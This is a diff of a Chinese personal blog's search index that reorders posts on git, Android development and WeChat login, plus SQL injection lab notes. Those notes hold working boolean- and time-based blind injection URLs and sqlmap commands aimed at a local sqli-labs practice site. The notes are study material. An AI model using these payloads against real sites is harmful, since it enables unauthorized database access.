+</code></pre><h2 id="本地修改内容同步到远程版本库"><a href="#本地修改内容同步到远程版本库" class="headerlink" title="本地修改内容同步到远程版本库"></a>本地修改内容同步到远程版本库</h2><pre><code>git push origin master
+</code></pre><h2 id="远程版本库修改同步到本地"><a href="#远程版本库修改同步到本地" class="headerlink" title="远程版本库修改同步到本地"></a>远程版本库修改同步到本地</h2><pre><code>git fetch origin master
+</code></pre><h2 id="查看远程版本库修改了那些东西"><a href="#查看远程版本库修改了那些东西" class="headerlink" title="查看远程版本库修改了那些东西"></a>查看远程版本库修改了那些东西</h2><pre><code>git diff origin/master
+</code></pre><p>之后在调用merge命令将origin/master分支上的修改合并到主分支上  </p>
+<pre><code>git merge origin/master
+</code></pre><p>pull命令是相当于 fetch和merge两个命令放在一起执行  </p>
+<pre><code>git pull origon master
+</code></pre><hr>
+<h2 id="查看已存放：（这个最有用）"><a href="#查看已存放：（这个最有用）" class="headerlink" title="查看已存放：（这个最有用）"></a>查看已存放：（这个最有用）</h2><pre><code>git ls-files
+</code></pre><h2 id="查看还没添加的文件："><a href="#查看还没添加的文件：" class="headerlink" title="查看还没添加的文件："></a>查看还没添加的文件：</h2><pre><code>git status
+</code></pre>]]></content>
+      <categories>
+        <category>git</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Burp抓Android的包</title>
     <url>/post/1340440380.html</url>
     <content><![CDATA[<h1 id="Burp抓Android的包"><a href="#Burp抓Android的包" class="headerlink" title="Burp抓Android的包"></a>Burp抓Android的包</h1><h2 id="设置ip"><a href="#设置ip" class="headerlink" title="设置ip"></a>设置ip</h2><p>设置-网络-查看ip地址  </p>
@@ -9473,28 +9473,6 @@ public class BaseFragment extends Fragment {
       <tags>
         <tag>android逆向</tag>
         <tag>android安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mac_终端用sublime打开文件</title>
-    <url>/post/576883658.html</url>
-    <content><![CDATA[<p><strong>打开文件</strong></p>
-<pre><code>vi ~/.bash_profile
-</code></pre><p><strong>添加命令</strong></p>
-<pre><code>alias subl=\&#39;&#39;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#39;\&#39;
-</code></pre><p><strong>启动</strong></p>
-<pre><code>source ~/.bash_profile 
-</code></pre><p><strong>使用命令</strong></p>
-<pre><code>subl 文件/目录
-
-subl ./_posts/2018-08-03-mac_sublime_open_file.md
-</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011240016/article/details/54434923" target="_blank" rel="noopener">终端用sublime打开文件的方法</a></p>
-]]></content>
-      <categories>
-        <category>macos</category>
-      </categories>
-      <tags>
-        <tag>macos</tag>
       </tags>
   </entry>
   <entry>
@@ -9579,6 +9557,41 @@ XCTF总决赛
       </tags>
   </entry>
   <entry>
+    <title>mac_终端用sublime打开文件</title>
+    <url>/post/576883658.html</url>
+    <content><![CDATA[<p><strong>打开文件</strong></p>
+<pre><code>vi ~/.bash_profile
+</code></pre><p><strong>添加命令</strong></p>
+<pre><code>alias subl=\&#39;&#39;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#39;\&#39;
+</code></pre><p><strong>启动</strong></p>
+<pre><code>source ~/.bash_profile 
+</code></pre><p><strong>使用命令</strong></p>
+<pre><code>subl 文件/目录
+
+subl ./_posts/2018-08-03-mac_sublime_open_file.md
+</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011240016/article/details/54434923" target="_blank" rel="noopener">终端用sublime打开文件的方法</a></p>
+]]></content>
+      <categories>
+        <category>macos</category>
+      </categories>
+      <tags>
+        <tag>macos</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blog链接</title>
+    <url>/post/1065774692.html</url>
+    <content><![CDATA[<p><a href="https://www.wikimoe.com/" target="_blank" rel="noopener">wikimoe_live2d</a><br><a href="https://qqdie.com/archives/l2d233.html" target="_blank" rel="noopener">Live2D看板娘来了！typecho插件</a><br><a href="https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02" target="_blank" rel="noopener">给博客添加能动的看板娘(Live2D)-将其添加到网页上吧</a><br><a href="https://www.wikimoe.com/?post=75" target="_blank" rel="noopener">emlog插件版之给博客加上能陪聊的Live2d版伊斯特瓦尔【ver1.04】</a><br><a href="https://www.wikimoe.com/?post=76" target="_blank" rel="noopener">博客通用版Live2d伊斯特瓦尔发布</a>  </p>
+<p><a href="https://xiaolin.in/read/hitokoto-api-xiaolin-edition.html" target="_blank" rel="noopener">一言</a>  </p>
+]]></content>
+      <categories>
+        <category>blog</category>
+      </categories>
+      <tags>
+        <tag>link</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>git切换远程分支命令</title>
     <url>/post/1524903793.html</url>
     <content><![CDATA[<p>1.克隆项目  </p>
@@ -9626,19 +9639,6 @@ remotes/origin/release
       <tags>
         <tag>web安全</tag>
         <tag>文件上传漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>blog链接</title>
-    <url>/post/1065774692.html</url>
-    <content><![CDATA[<p><a href="https://www.wikimoe.com/" target="_blank" rel="noopener">wikimoe_live2d</a><br><a href="https://qqdie.com/archives/l2d233.html" target="_blank" rel="noopener">Live2D看板娘来了！typecho插件</a><br><a href="https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02" target="_blank" rel="noopener">给博客添加能动的看板娘(Live2D)-将其添加到网页上吧</a><br><a href="https://www.wikimoe.com/?post=75" target="_blank" rel="noopener">emlog插件版之给博客加上能陪聊的Live2d版伊斯特瓦尔【ver1.04】</a><br><a href="https://www.wikimoe.com/?post=76" target="_blank" rel="noopener">博客通用版Live2d伊斯特瓦尔发布</a>  </p>
-<p><a href="https://xiaolin.in/read/hitokoto-api-xiaolin-edition.html" target="_blank" rel="noopener">一言</a>  </p>
-]]></content>
-      <categories>
-        <category>blog</category>
-      </categories>
-      <tags>
-        <tag>link</tag>
       </tags>
   </entry>
   <entry>
@@ -9752,9 +9752,21 @@ sh d2j-dex2jar.sh classes.dex
         <category>android逆向</category>
       </categories>
       <tags>
-        <tag>android逆向</tag>
         <tag>adnroid安全</tag>
         <tag>android反编译</tag>
+        <tag>android逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android思维导图</title>
+    <url>/post/758044765.html</url>
+    <content><![CDATA[<p><a href="https://tea9.xyz/pdf/Android_Mind_Map.pdf">android思维导图</a></p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
       </tags>
   </entry>
   <entry>
@@ -9870,44 +9882,6 @@ sqlmap -u &quot;http://127.0.0.1/Less-1/double.php?id=1%2527&quot; --current--+
       </categories>
       <tags>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android思维导图</title>
-    <url>/post/758044765.html</url>
-    <content><![CDATA[<p><a href="https://tea9.xyz/pdf/Android_Mind_Map.pdf">android思维导图</a></p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.自制脚本语言-第一章笔记</title>
-    <url>/post/395714690.html</url>
-    <content><![CDATA[<p>这是一个读两周自制脚本语言的笔记，然后立flag，这个月打算看完  </p>
-<h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><h2 id="1-1-机器语言-amp-汇编语言"><a href="#1-1-机器语言-amp-汇编语言" class="headerlink" title="1.1 机器语言 &amp; 汇编语言"></a>1.1 机器语言 &amp; 汇编语言</h2><ul>
-<li><p>机器语言： 不需要借助软件执行，不需要语言处理器，可以由硬件直接解释执行 一个位数很长的二进制数字</p>
-</li>
-<li><p>汇编语言： 通过汇编语言程序表述巨大的数字，使其易于理解，需要通过软件转换成机器语言，这种软件称为汇编程序。汇编程序是一种最基本的语言处理器</p>
-</li>
-</ul>
-<h2 id="1-2-解释器-amp-编译器"><a href="#1-2-解释器-amp-编译器" class="headerlink" title="1.2 解释器 &amp; 编译器"></a>1.2 解释器 &amp; 编译器</h2><ul>
-<li><p>解释器： 根据程序中的算法执行运算，执行程序的软件<br>如果执行的程序由虚拟机语言或类似机器语言程序设计语言写成，这种软件也能称为虚拟机</p>
-</li>
-<li><p>编译器： 能将某种语言写成的程序转换为另一种语言的程序<br>编译器转换程序的行为称为编译，转换前的程序称为源代码或源程序。<br>如果编译器没有把源代码直接转换为机器语言，称为源代码转换器或源码转换器</p>
-</li>
-</ul>
-<h2 id="1-3-开发语言处理器"><a href="#1-3-开发语言处理器" class="headerlink" title="1.3 开发语言处理器"></a>1.3 开发语言处理器</h2><p>Stone语言 运行于 Java虚拟机</p>
-<h2 id="1-4-语言处理器的结构与本书的框架"><a href="#1-4-语言处理器的结构与本书的框架" class="headerlink" title="1.4 语言处理器的结构与本书的框架"></a>1.4 语言处理器的结构与本书的框架</h2><p>源代码首先将进行词法分析，由一长串字符串细分为多个更小的字符串单元。分割后的字符串称为单词。之后处理器将执行语法分析处理，把单词的排列转换为抽象语法树。 之后 编译器会把抽象语法树转换为其他语言，而解释器将会一边分析抽象语法树一边执行运算</p>
-]]></content>
-      <categories>
-        <category>脚本语言</category>
-      </categories>
-      <tags>
-        <tag>脚本语言</tag>
       </tags>
   </entry>
   <entry>
@@ -10206,6 +10180,32 @@ textview以此排列
       </tags>
   </entry>
   <entry>
+    <title>1.自制脚本语言-第一章笔记</title>
+    <url>/post/395714690.html</url>
+    <content><![CDATA[<p>这是一个读两周自制脚本语言的笔记，然后立flag，这个月打算看完  </p>
+<h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><h2 id="1-1-机器语言-amp-汇编语言"><a href="#1-1-机器语言-amp-汇编语言" class="headerlink" title="1.1 机器语言 &amp; 汇编语言"></a>1.1 机器语言 &amp; 汇编语言</h2><ul>
+<li><p>机器语言： 不需要借助软件执行，不需要语言处理器，可以由硬件直接解释执行 一个位数很长的二进制数字</p>
+</li>
+<li><p>汇编语言： 通过汇编语言程序表述巨大的数字，使其易于理解，需要通过软件转换成机器语言，这种软件称为汇编程序。汇编程序是一种最基本的语言处理器</p>
+</li>
+</ul>
+<h2 id="1-2-解释器-amp-编译器"><a href="#1-2-解释器-amp-编译器" class="headerlink" title="1.2 解释器 &amp; 编译器"></a>1.2 解释器 &amp; 编译器</h2><ul>
+<li><p>解释器： 根据程序中的算法执行运算，执行程序的软件<br>如果执行的程序由虚拟机语言或类似机器语言程序设计语言写成，这种软件也能称为虚拟机</p>
+</li>
+<li><p>编译器： 能将某种语言写成的程序转换为另一种语言的程序<br>编译器转换程序的行为称为编译，转换前的程序称为源代码或源程序。<br>如果编译器没有把源代码直接转换为机器语言，称为源代码转换器或源码转换器</p>
+</li>
+</ul>
+<h2 id="1-3-开发语言处理器"><a href="#1-3-开发语言处理器" class="headerlink" title="1.3 开发语言处理器"></a>1.3 开发语言处理器</h2><p>Stone语言 运行于 Java虚拟机</p>
+<h2 id="1-4-语言处理器的结构与本书的框架"><a href="#1-4-语言处理器的结构与本书的框架" class="headerlink" title="1.4 语言处理器的结构与本书的框架"></a>1.4 语言处理器的结构与本书的框架</h2><p>源代码首先将进行词法分析，由一长串字符串细分为多个更小的字符串单元。分割后的字符串称为单词。之后处理器将执行语法分析处理，把单词的排列转换为抽象语法树。 之后 编译器会把抽象语法树转换为其他语言，而解释器将会一边分析抽象语法树一边执行运算</p>
+]]></content>
+      <categories>
+        <category>脚本语言</category>
+      </categories>
+      <tags>
+        <tag>脚本语言</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>1.4.1-SQL注入防御绕过-宽字节注入</title>
     <url>/post/2024290485.html</url>
     <content><![CDATA[<h2 id="01-宽字节注入原理"><a href="#01-宽字节注入原理" class="headerlink" title="01 宽字节注入原理"></a>01 宽字节注入原理</h2><blockquote>
@@ -10242,8 +10242,8 @@ sqlmap -u &quot;http://127.0.0.1/Less-32/?id=1%df&quot; // 通过宽字节注入
         <category>web安全</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>sql注入</tag>
+        <tag>web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -10345,27 +10345,6 @@ id: location.pathname,      // Ensure uniqueness and length less than 50{{ page.
       </tags>
   </entry>
   <entry>
-    <title>1.3.2-SQL注入-SQL盲注-时间盲注</title>
-    <url>/post/4135600167.html</url>
-    <content><![CDATA[<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png" alt=""></p>
-<h3 id="时间盲注方法"><a href="#时间盲注方法" class="headerlink" title="时间盲注方法"></a>时间盲注方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png" alt=""></p>
-<pre><code>http://localhost:90/Less-10/?id=1&quot; and if(left(user(),1)=&#39;a&#39;,0,sleep(3))--+
-
-http://localhost:90/Less-10/?id=1&quot; and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;r&#39;,0,sleep(3))--+
-</code></pre><p>时间注入脚本  </p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png" alt=""></p>
-<hr>
-<h2 id="links"><a href="#links" class="headerlink" title="links"></a>links</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzExNzI5Ng==&amp;mid=2648732982&amp;idx=1&amp;sn=159f2b13d7737232577ae11ccecb33d2&amp;chksm=f0d95f29c7aed63f2e0aea215f57672f7282de08c47a1033e6b2cfe1fee5fb788b4c8de405c0&amp;mpshare=1&amp;scene=23&amp;srcid=0702v4QOmQfViIjUPqq98LAc" target="_blank" rel="noopener">时间盲注</a></p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>sql盲注</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>1.3.3-SQL注入-SQL盲注-Dnslog盲注</title>
     <url>/post/2964387005.html</url>
     <content><![CDATA[<blockquote>
@@ -10407,50 +10386,24 @@ sql语句不能含有特殊符号
       </tags>
   </entry>
   <entry>
-    <title>android EventBus 使用</title>
-    <url>/post/3369655730.html</url>
-    <content><![CDATA[<p>2017 10 27<br>EventBus是什么？<br>首先有两个概念发布者/订阅者  </p>
-<p>发布者就是 发送事件<br>订阅者 就是接收事件  </p>
-<pre><code>gradle
+    <title>1.3.2-SQL注入-SQL盲注-时间盲注</title>
+    <url>/post/4135600167.html</url>
+    <content><![CDATA[<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png" alt=""></p>
+<h3 id="时间盲注方法"><a href="#时间盲注方法" class="headerlink" title="时间盲注方法"></a>时间盲注方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png" alt=""></p>
+<pre><code>http://localhost:90/Less-10/?id=1&quot; and if(left(user(),1)=&#39;a&#39;,0,sleep(3))--+
 
-compile &#39;org.greenrobot:eventbus:3.0.0&#39;
-</code></pre><p>1.定义事件</p>
-<pre><code>
-// 定义事件 这个就是你要传送的数据实体类
-public static class MessageEvent { /* Additional fields if needed */ }
-</code></pre>
-
-
-<p>2.准备订阅者</p>
-<pre><code>
-@Subscribe(threadMode = ThreadMode.MAIN)  
-public void onMessageEvent(MessageEvent event) {/* Do something */};
-
-// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式
-http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
-</code></pre>
-
-<p>注册和取消注册订阅者</p>
-<pre><code> @Override
- public void onStart() {
-     super.onStart();
-     EventBus.getDefault().register(this);
- }
-
- @Override
- public void onStop() {
-     super.onStop();
-     EventBus.getDefault().unregister(this);
- }
-</code></pre><p>3.发送事件</p>
-<pre><code>`EventBus.getDefault().post(new MessageEvent());`
-</code></pre>]]></content>
+http://localhost:90/Less-10/?id=1&quot; and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;r&#39;,0,sleep(3))--+
+</code></pre><p>时间注入脚本  </p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png" alt=""></p>
+<hr>
+<h2 id="links"><a href="#links" class="headerlink" title="links"></a>links</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzExNzI5Ng==&amp;mid=2648732982&amp;idx=1&amp;sn=159f2b13d7737232577ae11ccecb33d2&amp;chksm=f0d95f29c7aed63f2e0aea215f57672f7282de08c47a1033e6b2cfe1fee5fb788b4c8de405c0&amp;mpshare=1&amp;scene=23&amp;srcid=0702v4QOmQfViIjUPqq98LAc" target="_blank" rel="noopener">时间盲注</a></p>
+]]></content>
       <categories>
-        <category>android</category>
+        <category>web安全</category>
       </categories>
       <tags>
-        <tag>android</tag>
-        <tag>eventbus</tag>
+        <tag>sql注入</tag>
+        <tag>sql盲注</tag>
       </tags>
   </entry>
   <entry>
@@ -10549,221 +10502,50 @@ http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
       </tags>
   </entry>
   <entry>
-    <title>android微信第三方登录2</title>
-    <url>/post/273860866.html</url>
-    <content><![CDATA[<p>利用http与微信通信换取用户信息和openid<br>使用了okhttp作为http通信的框架  </p>
-<hr>
-<ol>
-<li><p>首先实例化okhttp连接  </p>
-<p> <code>private final OkHttpClient client = new OkHttpClient();</code></p>
-</li>
-</ol>
-<h6 id="获得code"><a href="#获得code" class="headerlink" title="获得code"></a>获得code</h6><pre><code>case BaseResp.ErrCode.ERR_OK:
-//      可用以下两种方法获得code
-//      resp.toBundle(bundle);
-//      Resp sp = new Resp(bundle);
-//      String code = sp.code;
-//      或者
-String code = ((SendAuth.Resp) baseResp).code;
-String state = ((SendAuth.Resp) baseResp).state;
-Toast.makeText(getApplicationContext(), &quot;恭喜这是你的code&quot; + code, Toast.LENGTH_LONG).show();
-Log.e(TAG, &quot;onResp: &quot; + code);
-try {
-    getAccess_token(code);
-} catch (Exception e) {
-    e.printStackTrace();
-}
-//上面的code就是接入指南里要拿到的code
-break;
-</code></pre><hr>
-<h6 id="根据code获取用户信息"><a href="#根据code获取用户信息" class="headerlink" title="根据code获取用户信息"></a>根据code获取用户信息</h6><pre><code>private void getAccess_token(String code) throws Exception {
-    String url = &quot;https://api.weixin.qq.com/sns/oauth2/access_token?&quot; +
-            &quot;appid=&quot; + ConfigUtil.Wechat_Appid +
-            &quot;&amp;secret=&quot; + ConfigUtil.Wechat_AppSecret +
-            &quot;&amp;code=&quot; + code +
-            &quot;&amp;grant_type=authorization_code&quot;;
-    run(url);
-}
-</code></pre><hr>
-<h6 id="引入okhttp包"><a href="#引入okhttp包" class="headerlink" title="引入okhttp包"></a>引入okhttp包</h6><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e535b2d91c6473b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="引入okhttp的包"></p>
-<pre><code>//通过http与微信通信
-public void run(String url) throws Exception {
-final Request request = new Request.Builder()
-        //.url(&quot;http://publicobject.com/helloworld.txt&quot;)
-        .url(url)
-        .get()
-        .build();
+    <title>android EventBus 使用</title>
+    <url>/post/3369655730.html</url>
+    <content><![CDATA[<p>2017 10 27<br>EventBus是什么？<br>首先有两个概念发布者/订阅者  </p>
+<p>发布者就是 发送事件<br>订阅者 就是接收事件  </p>
+<pre><code>gradle
 
-client.newCall(request).enqueue(new Callback() {
-    @Override
-    public void onFailure(Call call, IOException e) {
-        e.printStackTrace();
-    }
-
-    @Override
-    public void onResponse(Call call, Response response) throws IOException {
-        if (!response.isSuccessful()) throw new IOException(&quot;Unexpected code &quot; + response);
-        try {
-            String responseStr=response.body().string();
-            JSONObject jsonObject = new JSONObject(responseStr);
-            System.out.println(TAG + jsonObject.getString(&quot;access_token&quot;));//在回调中获取access_token
-        } catch (JSONException e) {
-            e.printStackTrace();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-
-    }
-});
-}
-</code></pre><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>如果微信调不起来<br>仔细检查签名是否正确<br>如果修改过签名<br>可以重新安装下微信再试一下  </p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-        <tag>weixin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.3.1-SQL注入-SQL盲注-布尔盲注</title>
-    <url>/post/2904355367.html</url>
-    <content><![CDATA[<h2 id="SQL盲注-布尔盲注"><a href="#SQL盲注-布尔盲注" class="headerlink" title="SQL盲注-布尔盲注"></a>SQL盲注-布尔盲注</h2><h3 id="01布尔盲注原理"><a href="#01布尔盲注原理" class="headerlink" title="01布尔盲注原理"></a>01布尔盲注原理</h3><pre><code>$id=$_GET[&#39;id&#39;];
-$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1 &quot;;
-$result=mysql_query($sql);
-$row=mysql_fetch_array($result);
-if($row)
-{
-    echo &quot;Right&quot;;
-}
-else
-{
-    echo &quot;Wrong&quot;;
-}
-</code></pre><p>代码存在SQL注入漏洞<br>然而页面即不会回显数据，也不会回显错误信息  </p>
-<p>只返回 “Right” 与 “Wrong”   </p>
-<p>这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的“真”和“假”来识别我们的判断是否正确，这既是布尔盲注！  </p>
-<p>正确请求，id=1 -&gt; 返回 id=1的数据  </p>
-<p>错误请求，id=1’ -&gt; 返回 与正确页面不同的页面<br>1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id=1 and left((select version()),1)=5–+<br>2.想办法构造语句，判断数据库中内容的值<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/01.jpeg" alt=""></p>
-<h3 id="02布尔盲注方法"><a href="#02布尔盲注方法" class="headerlink" title="02布尔盲注方法"></a>02布尔盲注方法</h3><p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入  </p>
-<pre><code>left() left(database(),1)&gt;&#39;s&#39;
-        database()显示数据库名称，left(a,b)从左侧截取a的前b位
-regexp select user() regexp &#39;^r&#39;
-        正则表达式的用法user()结果位root,regexp为匹配root的正则表达式
-like    select user() like &#39;ro%&#39;
-        与regexp类似，使用like进行匹配
-substr()  ascii(substr((select database()),1,1))=98
-ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
-ord()    ord(mid((select user()),1,1))=114
-mid()    mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/02.jpeg" alt=""></p>
-<p><a href="http://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">MySql正则表达式</a></p>
-<p>注入点： </p>
-<pre><code>http://localhost:90/Less-8/?id=1&#39;
-http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;a&#39;--+
-http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39;--+ 显示正确第一位为s
-
-http://localhost:90/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+ 第一个表名称字符
-
-http://localhost:90/Less-8/?id=1&#39; and (select database() regexp &#39;^s&#39;)--+
-
-http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^s&#39;)--+
-
-http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;e%&#39;)--+
-
-http://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+
-
-http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from information_schema.tables where table_schema=database()),1,1))=115--+
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/ascii.jpg" alt=""></p>
-<h2 id="burp操作步骤"><a href="#burp操作步骤" class="headerlink" title="burp操作步骤"></a>burp操作步骤</h2><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/03.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/04.jpg" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/05.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/06.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/07.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>sql盲注</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android微信第三方登录1</title>
-    <url>/post/2304481464.html</url>
-    <content><![CDATA[<p><a href="https://github.com/shaomiao/AndroidWechatTest" target="_blank" rel="noopener">github测试地址</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=11_1" target="_blank" rel="noopener">微信SDK下载地址</a><br><a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台</a><br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=1417751808&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">微信api</a>  </p>
-<h2 id="开始接入微信登录"><a href="#开始接入微信登录" class="headerlink" title="开始接入微信登录"></a>开始接入微信登录</h2><p>1.申请你的AppID<br>注意：  </p>
-<h5 id="包名正确（重要）"><a href="#包名正确（重要）" class="headerlink" title="包名正确（重要）"></a>包名正确（重要）</h5><h5 id="签名正确（重要）"><a href="#签名正确（重要）" class="headerlink" title="签名正确（重要）"></a>签名正确（重要）</h5><p>微信提供的签名生成工具<br>把包名添加上去就可以获取签名<br>注意：把要获取签名的应用安装在手机上<br><a href="https://res.wx.qq.com/open/zh_CN/htmledition/res/dev/download/sdk/Gen_Signature_Android2.apk" target="_blank" rel="noopener">获取签名应用</a>  </p>
-<p>2.下载开发工具包<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN" target="_blank" rel="noopener">https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN</a>  </p>
-<p>3.在项目中引入开发包<br><img src="http://upload-images.jianshu.io/upload_images/2590671-b6783667e961b04b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在项目中引入开发工具包">  </p>
-<p>4.使用开发工具包<br>下面代码都是在MainActivity中<br>[1]注册微信  </p>
+compile &#39;org.greenrobot:eventbus:3.0.0&#39;
+</code></pre><p>1.定义事件</p>
 <pre><code>
-private static final String APP_ID="你的appid";
-private IWXAPI api;
-private void regToWx(){
-    api= WXAPIFactory.createWXAPI(this,APP_ID,true);
-    api.registerApp(APP_ID);
-}
-@Override
-protected void onCreate(Bundle savedInstanceState) {
-      super.onCreate(savedInstanceState);
-      setContentView(R.layout.activity_main);
-      //注册微信
-      regToWx();
-}
+// 定义事件 这个就是你要传送的数据实体类
+public static class MessageEvent { /* Additional fields if needed */ }
 </code></pre>
 
 
+<p>2.准备订阅者</p>
+<pre><code>
+@Subscribe(threadMode = ThreadMode.MAIN)  
+public void onMessageEvent(MessageEvent event) {/* Do something */};
 
+// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式
+http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
+</code></pre>
 
-<p>[2]登录微信</p>
-<pre><code>@Override
-protected void onCreate(Bundle savedInstanceState) {
-    super.onCreate(savedInstanceState);
-    setContentView(R.layout.activity_main);
-    //注册微信
-    regToWx();
-    findViewById(R.id.wechat_login).setOnClickListener(new View.OnClickListener() {
-        @Override
-        public void onClick(View v) {
-            //登录微信
-            final SendAuth.Req req = new SendAuth.Req();
-            req.scope = &quot;snsapi_userinfo&quot;;
-            req.state = &quot;wechat_sdk_demo_test&quot;;
-            api.sendReq(req);
-        }
-    });
-}
-</code></pre><p>5.下面是最重要的一步。。。。<br>[1]建包<br>注意：要在你的包名下新建 wxapi 包<br>你的包名.wxapi  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-972bd98cefcbe360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="你的包名.wxapi"></p>
-<p>[2]建立与微信通讯的activity<br>在wxapi下新建activity<br>WXEntryActivity<br>[3]在AndroidManifest.xml中添加权限.   </p>
-<pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt; 
